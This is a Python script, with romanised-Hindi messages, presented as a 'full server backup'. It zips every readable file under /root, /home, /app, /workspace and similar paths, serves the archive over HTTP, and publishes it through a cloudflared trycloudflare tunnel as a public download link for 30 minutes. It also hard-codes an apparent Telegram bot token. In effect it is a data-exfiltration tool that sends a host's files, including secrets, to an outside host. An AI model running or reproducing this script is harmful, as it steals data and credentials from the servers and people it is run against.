import os
import zipfile
import http.server
import socketserver
import threading
import socket
import subprocess
import time

BOT_TOKEN = "8824366795:AAFoDJWTYwRcuExbpVVpgGhWmTidUPkskUU"
BACKUP_NAME = "FULL_SERVER_BACKUP"
RUN_TIME = 1800

IGNORE_DIRS = {
    "__pycache__", ".git", "venv",
    "node_modules", ".cache", "proc", "sys"
}

SEARCH_PATHS = [
    "/app",
    "/home",
    "/root",
    "/workspace",
    "/code",
    "/project",
    "/data",
    "/var/data",
    "/usr/src/app",
    os.getcwd(),
    os.path.expanduser("~"),
]

def get_free_port():
    s = socket.socket()
    s.bind(('', 0))
    port = s.getsockname()[1]
    s.close()
    return port

PORT = get_free_port()

def create_backup():
    print("\n[1] ZIP Backup ban raha hai...\n")

    added_files = set()

    with zipfile.ZipFile(f"{BACKUP_NAME}.zip", "w", zipfile.ZIP_DEFLATED) as zipf:

        for search_path in SEARCH_PATHS:

            if not os.path.exists(search_path):
                print(f"[SKIP PATH] {search_path} exist nahi karta")
                continue

            print(f"\n[SCANNING] {search_path}")

            for root, dirs, files in os.walk(search_path):

                dirs[:] = [d for d in dirs if d not in IGNORE_DIRS
                          and not d.startswith("proc")
                          and not d.startswith("sys")]

                for file in files:
                    try:
                        filepath = os.path.join(root, file)
                        real_path = os.path.realpath(filepath)

                        if real_path in added_files:
                            continue

                        if BACKUP_NAME in filepath:
                            continue

                        if file == "cloudflared":
                            continue

                        arcname = filepath.lstrip("/")
                        zipf.write(filepath, arcname)
                        added_files.add(real_path)
                        print(f"  [ADD] {arcname}")

                    except PermissionError:
                        print(f"  [NO ACCESS] {file}")
                    except Exception as e:
                        print(f"  [SKIP] {file} -> {e}")

    size_mb = os.path.getsize(f"{BACKUP_NAME}.zip") / (1024*1024)
    print(f"\n[OK] Backup ZIP Ready — Size: {size_mb:.2f} MB")

def start_server():
    Handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print(f"\n[OK] Local Server Running Port {PORT}")
        httpd.serve_forever()

def start_tunnel():
    print("\n[2] Tunnel create ho raha hai...")

    # Cloudflared already downloaded hai — seedha use karega
    cmd = f"./cloudflared tunnel --url http://127.0.0.1:{PORT}"

    process = subprocess.Popen(
        cmd, shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

    for line in process.stdout:
        print(line.strip())
        if "trycloudflare.com" in line:
            words = line.split()
            for word in words:
                if "https://" in word and "trycloudflare.com" in word:
                    final_url = f"{word}/{BACKUP_NAME}.zip"
                    print("\n==============================")
                    print("✅ DIRECT DOWNLOAD URL:")
                    print("==============================\n")
                    print(final_url)
                    print("\n==============================")
                    print("COPY KARO AUR CHROME MEIN KHOLO")
                    print("==============================\n")
                    return

if __name__ == "__main__":
    create_backup()

    server_thread = threading.Thread(target=start_server)
    server_thread.daemon = True
    server_thread.start()

    time.sleep(3)

    tunnel_thread = threading.Thread(target=start_tunnel)
    tunnel_thread.daemon = True
    tunnel_thread.start()

    print(f"\n[INFO] Server {RUN_TIME//60} minute active rahega")
    time.sleep(RUN_TIME)
